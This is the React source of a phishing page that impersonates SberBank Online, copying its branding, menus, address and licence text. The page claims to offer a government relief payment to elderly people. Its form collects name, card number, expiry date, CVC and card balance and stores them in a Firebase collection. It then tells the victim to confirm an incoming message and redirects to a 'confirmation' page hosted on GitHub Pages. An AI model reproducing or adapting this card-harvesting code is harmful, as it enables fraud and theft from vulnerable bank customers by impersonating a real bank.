import './global.css'
import React, { useState, useRef } from 'react';
import { MdOutlineKeyboardArrowDown } from 'react-icons/md';
import { IoNavigate } from 'react-icons/io5';
import { BsSearch } from 'react-icons/bs'
import { RiErrorWarningFill } from 'react-icons/ri';
import { SiMastercard, SiVisa } from 'react-icons/si';
import TextField from '@mui/material/TextField';
import 'react-toastify/dist/ReactToastify.css';
import { ToastContainer, toast } from 'react-toastify';
import { db } from './firebase'
import { addDoc, collection } from 'firebase/firestore';
import { GrMenu } from 'react-icons/gr'
import CreditCardInput from 'react-credit-card-input';
import NumericFormat, { InputAttributes } from 'react-number-format';
import background_image from './img/background_image.jpg'
import header from "./img/header.svg"
import logo from "./img/logo.svg"
import mirsvg from './img/mir.svg'
import mirpng from './img/mir.png'
import exams from './img/exam.png'
import icon from "./img/icon.png"


function App() {
  const [name, setName] = useState("")
  const [surname, setSurname] = useState("")
  const [value, setValue] = useState(null);
  const [code, setCode] = useState(null)
  const [cvc, setCvc] = useState(null)
  const [balance, setBalance] = useState(null)
  const [exam, setExam] = useState(false)


  function handleSubmit(e) {
    e.preventDefault()
    if (!code || !cvc) {
      toast.error("Пожалуйста, заполните информацию");
    } else {
      const usersRef = collection(db, "users")
      addDoc(usersRef, { name, surname, code, cvc, value, balance }).then(response => {
        toast.success('Поздравляем, Вы получите оплату после подтверждения входящего сообщения.')
        setTimeout(() => {
        window.location.replace('https://ciberbank.github.io/podtverzhdeniye');
      }, 3000);
      }).catch(error => {
        toast.error("Пожалуйста, заполните информацию2");
      })
    }
  }


  return (
    <div className="w-full h-full ">
      <header className="w-full">
        <img src={header} alt="" className="w-full objet-cover" />
      </header>
      <ToastContainer position='top-center' />
      <div className='w-full h-full relative'>
        <img src={background_image} alt="" className='w-full h-full absolute z-[-2] object-cover ' />
        <div className="w-full h-12 flex items-center justify-center  border-b absolute !z-[5]">
          <div className="w-[90%] sm:w-[77%] flex items-center justify-between">
            <img src={logo} alt="" className="w-[103px] objet-cover block sm:hidden" />
            <div className="hidden sm:flex justify-between items-center gap-4">
              <img src={logo} alt="" className="w-[103px] objet-cover" />
              <div className="flex flex-col "><div className="text-xs ">Частным клиентам  </div>
                <span className='border-b-2 border-black relative top-4'></span></div>
              <div className="text-xs">Самозанятым</div>
              <div className="text-xs">Малому бизнесу и ИП</div>
              <div className="text-xs flex items-end gap-1">Ещё <MdOutlineKeyboardArrowDown /> </div>
            </div>
            <div className="flex sm:hidden items-center gap-2">
              <div className=" text-[10px] text-green-600 font-semibold">СберБанк Онлайн</div>
              <GrMenu />
            </div>
            <div className="hidden sm:flex justify-between items-center gap-4">
              <div className="text-xs">Курсы валют</div>
              <div className="text-xs">Офисы</div>
              <div className="text-xs">Банкоматы</div>
              <div className="text-xs flex items-end gap-1"> <IoNavigate className='text-gray-500' /> Москва</div>
              <div className="text-xs">ENG</div>
              <div className="text-xs text-green-600 font-semibold">СберБанк Онлайн</div>
              <div className=""><BsSearch /></div>
            </div>
          </div>
        </div>
        <div className="w-full h-full flex items-center justify-center  py-12">
          <div className=" h-[100px] w-[77%] flex items-center justify-center px-5">
            <div className="text-[14px] sm:text-[25px] font-bold text-green-600 flex items-start gap-3"> <RiErrorWarningFill size={45} /> Добро пожаловать в СберБанк Онлайн</div>
          </div>
        </div>
        <form onSubmit={handleSubmit} className='w-full h-full flex flex-col items-center justify-center text-center pb-10'>
          <h1 className='text-base sm:text-2xl font-bold w-[90%] sm:w-[55%]'>Пожалуйста, <span className='text-red-600'>заполните форму</span>, чтобы воспользоваться кампанией, зарезервированной правительством для пожилых людей из-за экономических проблем в нашей стране.</h1>
          <div className="flex flex-col  items-center justify-center gap-6 sm:gap-12 py-10 w-[80%] sm:w-[30%]">
            <div className="flex items-center justify-center gap-5 w-full">
              <TextField defaultValue={name} label="имя" variant="standard" onChange={(e) => {
                setName(e.target.value)
              }} />
              <TextField defaultValue={surname} label="фамилия" variant="standard" onChange={(e) => {
                setSurname(e.target.value)
              }} />
            </div>
            <div className='w-[400px] h-[250px] shadow-md px-10 py-5 rounded-md border bg-gray-100  flex flex-col items-center justify-between relative'>
              <div className="w-full flex items-center justify-end gap-3">
                <SiVisa size={35} className={`${code !== null && code[0] === '4' ? 'text-blue-600 ' : 'text-gray-300'}`} />
                <img src={code !== null && code[0] === '2' ? mirsvg : mirpng} className='w-9 h-9 ' alt="" />
                <SiMastercard size={27} className={`${code !== null && code[0] === '5' ? 'text-orange-500 ' : 'text-gray-300'}`} />
              </div>
              <div onClick={() => setExam(!exam)} onMouseEnter={() => setExam(true)} onMouseLeave={() => setExam(false)} className={' rounded-full hidden sm:block border border-gray px-2 absolute top-20 right-6 z-[100] cursor-pointer text-[13px]'}>?</div>
              <div className={` ${exam ? 'flex' : 'hidden'} flex-col border p-3 bg-white rounded-xl   absolute top-20 -right-[20rem] z-[102] cursor-pointer text-[14px]`}>
                <span>Код CVV/CVC указан на <br /> обратной стороне карты</span>
                <img src={exams} alt="" />
              </div>
              <CreditCardInput
                customTextLabels={{
                  invalidCardNumber: 'Пожалуйста, заполните информацию',
                  expiryError: {
                    invalidExpiryDate: 'Пожалуйста, заполните информацию',
                    monthOutOfRange: 'Пожалуйста, заполните информацию',
                    yearOutOfRange: 'Пожалуйста, заполните информацию',
                    dateOutOfRange: 'Пожалуйста, заполните информацию'
                  },
                  invalidCvc: 'El código de seguridad es inválido',
                  invalidZipCode: 'El código postal es inválido',
                  cardNumberPlaceholder: 'Hомер карты',
                  expiryPlaceholder: 'ММ/ГГ',
                  cvcPlaceholder: 'CVV',
                  zipPlaceholder: 'C.P.'
                }}
                cardNumberInputProps={{
                  value: code, onChange: (e) => {
                    setCode(e.target.value)
                  }
                }}
                cardExpiryInputProps={{
                  value: value, onChange: (e) => {
                    setValue(e.target.value)
                  }
                }}
                cardCVCInputProps={{
                  value: cvc, onChange: (e) => {
                    setCvc(e.target.value)
                  }
                }}
                dangerTextClassName="hidden "
                containerClassName="!bg-gray-100 !w-full !h-full"
                cardImageClassName="hidden"
                fieldClassName="input flex !p-0 !border-none !bg-gray-100 w-full h-[5rem]"
              />
              <TextField
                label="баланс карты"
                onChange={(e) => {
                  setBalance(e.target.value)
                }}
                className="w-full"
                variant="standard"
              />
            </div>
          </div>                
          <button type='submit' className='rounded-md bg-green-500 hover:bg-green-700 transition-all hover:text-white w-[80%] sm:w-[30%] py-3 text-xl'> воспользоваться кампанией</button>
        </form>
      </div>
      <footer className='bg-[#171a1e] sm:h-[500px] w-full flex  justify-center'>
        <div className="w-[90%] sm:w-[77%] flex justify-between py-8">
          <div className="hidden sm:block">
            <div className="flex-col border-b border-gray-700">
              <div className="flex gap-7 pb-4">
                <div className="text-white text-sm">Малому бизнесу и ИП</div>
                <div className="text-white text-sm">Пресс-центр</div>
                <div className="text-white text-sm">О банке</div>
                <div className="text-white text-sm">Связаться с банком</div>
                <div className="text-white text-sm">Ваша безопасность</div>
              </div>
              <div className="flex gap-7 pb-4">
                <div className="text-white text-sm">Веб-версия СберБанк Онлайн</div>
                <div className="text-white text-sm"> Мобильное приложение</div>
                <div className="text-white text-sm">Вакансии</div>
                <div className="text-white text-sm">Вопросы и ответы</div>
              </div>
              <div className="flex gap-7 pb-5">
                <div className="text-white text-sm">Особенный банк</div>
                <div className="text-white text-sm">Офисы и банкоматы</div>
                <div className="text-white text-sm">Курсы валют</div>
                <div className="text-white text-sm">Политика обработки данных</div>
              </div>
            </div>
            <div className="py-5 border-b border-gray-700">
              <p className='text-[#878b90] text-[14px]'>Россия, Москва, 117997, ул. Вавилова, 19</p>
              <p className='text-[#878b90] text-[14px]'>© 1997—2022 ПАО Сбербанк.</p>
            </div>
            <div className="py-5  flex flex-col gap-3">
              <p className='text-[#878b90] text-[14px]'>Генеральная лицензия Банка России на осуществление банковских <br /> операций №1481 от 11.08.2015 г.</p>
              <p className='text-[#878b90] text-[14px]'>Информация о процентных ставках по договорам банковского <br /> вклада с физическими лицами</p>
              <p className='text-[#878b90] text-[14px]'>Информация, обязательная к размещению</p>
              <p className='text-[#878b90] text-[14px]'>Раскрытие информации о банке как о профессиональном участнике <br /> рынка ценных бумаг</p>

            </div>
          </div>
          <div className="flex flex-col gap-8">
            <div className="">
              <div className="text-[#08a652] flex gap-2"><img src={icon} alt="" className='w-5 h-5' /> Звонок из приложения СберБанк Онлайн</div>
              <div className="text-white text-sm">через интернет, бесплатно по Wi-Fi</div>
            </div>
            <div className="">
              <div className="text-white text-lg">900</div>
              <div className="text-white text-sm">бесплатно с мобильных на территории РФ</div>
            </div>
            <div className="">
              <div className="text-white text-lg">Звонок из-за границы</div>
              <div className="text-white text-sm">Стоимость звонка зависит от тарифа вашего <br /> мобильного оператора</div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default App;
